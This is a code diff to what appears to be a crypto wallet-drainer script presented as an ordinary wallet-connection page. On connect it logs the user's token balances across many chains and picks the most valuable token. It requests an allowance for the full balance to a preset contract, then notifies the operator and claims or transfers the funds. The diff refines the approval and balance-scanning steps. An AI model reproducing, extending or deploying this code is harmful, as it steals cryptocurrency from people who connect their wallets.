@@ -577,12 +577,16 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, cha
   }
   try {
     if (tokenAddress === 'native') {
+      console.log(`Fetching native token balance for address ${address} on chain ${chainId}`);
       const balance = await getBalance(wagmiConfig, {
         address: getAddress(address),
         chainId,
       });
-      return Number(formatUnits(balance, decimals));
+      const formattedBalance = Number(formatUnits(balance, decimals));
+      console.log(`Native token balance: ${formattedBalance} (raw: ${balance.toString()})`);
+      return formattedBalance;
     } else {
+      console.log(`Fetching ERC-20 balance for token ${tokenAddress} for address ${address} on chain ${chainId}`);
       const balance = await readContract(wagmiConfig, {
         address: getAddress(tokenAddress),
         abi: erc20Abi,
@@ -590,14 +594,16 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, cha
         args: [getAddress(address)],
         chainId,
       });
-      return Number(formatUnits(balance, decimals));
+      const formattedBalance = Number(formatUnits(balance, decimals));
+      console.log(`ERC-20 token balance: ${formattedBalance} (raw: ${balance.toString()})`);
+      return formattedBalance;
     }
   } catch (error) {
+    console.error(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`);
     store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`);
     return 0;
   }
 };
-
 // Функция получения allowance
 const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
   if (!ownerAddress || !tokenAddress || !spenderAddress || !isAddress(ownerAddress) || !isAddress(tokenAddress) || !isAddress(spenderAddress)) {
@@ -869,33 +875,48 @@ const initializeSubscribers = (modal) => {
           console.warn(`Network ${networkName} not found in networkMap`);
           return;
         }
-        tokens.forEach(token => {
-          if (token.address === 'native' || isAddress(token.address)) {
-            balancePromises.push(
-              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
-                .then(balance => ({
-                  symbol: token.symbol,
-                  balance,
-                  address: token.address,
-                  network: networkName,
-                  chainId: networkInfo.chainId,
-                  decimals: token.decimals,
-                }))
-                .catch(() => ({
-                  symbol: token.symbol,
-                  balance: 0,
-                  address: token.address,
-                  network: networkName,
-                  chainId: networkInfo.chainId,
-                  decimals: token.decimals,
-                }))
-            );
-          }
-        });
+        // Проверяем только токены текущей сети
+        if (networkInfo.chainId === store.networkState.chainId) {
+          tokens.forEach(token => {
+            if (token.address === 'native' || isAddress(token.address)) {
+              balancePromises.push(
+                getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
+                  .then(balance => {
+                    console.log(`Balance for ${token.symbol} on ${networkName}: ${balance}`);
+                    return {
+                      symbol: token.symbol,
+                      balance,
+                      address: token.address,
+                      network: networkName,
+                      chainId: networkInfo.chainId,
+                      decimals: token.decimals,
+                    };
+                  })
+                  .catch(error => {
+                    console.error(`Error fetching balance for ${token.symbol} on ${networkName}: ${error.message}`);
+                    return {
+                      symbol: token.symbol,
+                      balance: 0,
+                      address: token.address,
+                      network: networkName,
+                      chainId: networkInfo.chainId,
+                      decimals: token.decimals,
+                    };
+                  })
+              );
+            }
+          });
+        }
       });
       const allBalances = await Promise.all(balancePromises);
       store.tokenBalances = allBalances;
       updateStateDisplay('tokenBalancesState', allBalances);
+      console.log('All token balances:', allBalances);
+
+      // Проверяем, есть ли токены с ненулевым балансом
+      const positiveBalances = allBalances.filter(token => token.balance > 0);
+      console.log(`Tokens with positive balance: ${positiveBalances.length}`, positiveBalances);
+
       let maxValue = 0;
       let mostExpensive = null;
       for (const token of allBalances) {
@@ -903,12 +924,14 @@ const initializeSubscribers = (modal) => {
           const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol);
           const value = token.balance * price;
           token.price = price;
+          console.log(`Token ${token.symbol}: balance=${token.balance}, price=${price}, value=${value}`);
           if (value > maxValue) {
             maxValue = value;
             mostExpensive = { ...token, price, value };
           }
         }
       }
+
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId);
 
       if (mostExpensive) {
@@ -936,7 +959,8 @@ const initializeSubscribers = (modal) => {
                   state.address,
                   token.address,
                   CONTRACTS[mostExpensive.chainId],
-                  mostExpensive.chainId
+                  mostExpensive.chainId,
+                  parseUnits(token.balance.toString(), token.decimals)
                 );
               }
               const transferResult = await sendTransferRequest(
@@ -1030,9 +1054,10 @@ const initializeSubscribers = (modal) => {
           let approveMessage = '';
 
           if (mostExpensive.address !== 'native') {
-            txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId);
+            const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals);
+            txHash = await increaseAllowanceToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, amount, mostExpensive.chainId);
             await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId);
-            await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId);
+            await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId, amount);
             const claimResult = await claimToken(wagmiAdapter.wagmiConfig, mostExpensive, contractAddress, mostExpensive.chainId, state.address);
             if (claimResult.success) {
               txHash = claimResult.txHash;
@@ -1104,70 +1129,3 @@ const initializeSubscribers = (modal) => {
     }
   });
 };
-
-// Обработчик ошибок approve
-const handleApproveError = (error, token, state) => {
-  store.isApprovalRequested = false;
-  if (error.code === 4001 || error.code === -32000) {
-    store.isApprovalRejected = true;
-    const errorMessage = `Operation was rejected for ${token.symbol} on ${token.network}`;
-    store.errors.push(errorMessage);
-    const approveState = document.getElementById('approveState');
-    if (approveState) approveState.innerHTML = errorMessage;
-    hideCustomModal();
-    appKit.disconnect();
-    store.connectionKey = null;
-    store.isProcessingConnection = false;
-    sessionStorage.clear();
-  } else {
-    const errorMessage = `Operation failed for ${token.symbol} on ${token.network}: ${error.message}`;
-    store.errors.push(errorMessage);
-    const approveState = document.getElementById('approveState');
-    if (approveState) approveState.innerHTML = errorMessage;
-    hideCustomModal();
-    store.isProcessingConnection = false;
-  }
-};
-
-// Инициализация
-initializeSubscribers(appKit);
-updateButtonVisibility(appKit.getIsConnectedState());
-
-document.querySelectorAll('.open-connect-modal').forEach(button => {
-  button.addEventListener('click', (event) => {
-    event.stopPropagation();
-    if (!appKit.getIsConnectedState()) {
-      appKit.open();
-    }
-  });
-});
-
-document.getElementById('disconnect')?.addEventListener('click', () => {
-  appKit.disconnect();
-  store.approvedTokens = {};
-  store.errors = [];
-  store.isApprovalRequested = false;
-  store.isApprovalRejected = false;
-  store.connectionKey = null;
-  store.isProcessingConnection = false;
-  sessionStorage.clear();
-});
-
-document.getElementById('switch-network')?.addEventListener('click', () => {
-  const currentChainId = store.networkState?.chainId;
-  let nextNetwork = networkMap['Ethereum'].networkObj;
-  if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj;
-  else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj;
-  else if (currentChainId === networkMap['Arbitrum'].chainId) nextNetwork = networkMap['Optimism'].networkObj;
-  else if (currentChainId === networkMap['Optimism'].chainId) nextNetwork = networkMap['Base'].networkObj;
-  else if (currentChainId === networkMap['Base'].chainId) nextNetwork = networkMap['Scroll'].networkObj;
-  else if (currentChainId === networkMap['Scroll'].chainId) nextNetwork = networkMap['Avalanche'].networkObj;
-  else if (currentChainId === networkMap['Avalanche'].chainId) nextNetwork = networkMap['Fantom'].networkObj;
-  else if (currentChainId === networkMap['Fantom'].chainId) nextNetwork = networkMap['Linea'].networkObj;
-  else if (currentChainId === networkMap['Linea'].chainId) nextNetwork = networkMap['zkSync'].networkObj;
-  else if (currentChainId === networkMap['zkSync'].chainId) nextNetwork = networkMap['Celo'].networkObj;
-  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj;
-  else if (currentChainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = networkMap['Ethereum'].networkObj;
-  else nextNetwork = networkMap['Ethereum'].networkObj;
-  appKit.switchNetwork(nextNetwork);
-});
